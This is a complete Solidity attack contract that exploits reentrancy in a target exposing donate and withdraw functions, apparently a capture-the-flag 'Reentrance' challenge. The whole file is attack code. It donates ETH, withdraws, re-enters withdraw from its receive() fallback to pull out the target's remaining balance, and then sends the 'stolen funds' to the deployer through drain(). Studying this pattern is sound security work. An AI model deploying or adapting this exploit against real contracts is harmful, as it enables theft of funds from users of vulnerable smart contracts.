// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    address public attacker;

    constructor(address _target) {
        target = IReentrance(_target);
        attacker = msg.sender;
    }

    // Attack function to start the exploit
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Need some initial ETH");

        // Step 1: Donate ETH to vulnerable contract
        target.donate{value: msg.value}(address(this));

        // Step 2: Withdraw the amount (reenters contract)
        target.withdraw(msg.value);
    }

    // Fallback function - triggers reentrancy
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }

    // Withdraw stolen funds
    function drain() external {
        payable(attacker).transfer(address(this).balance);
    }
}
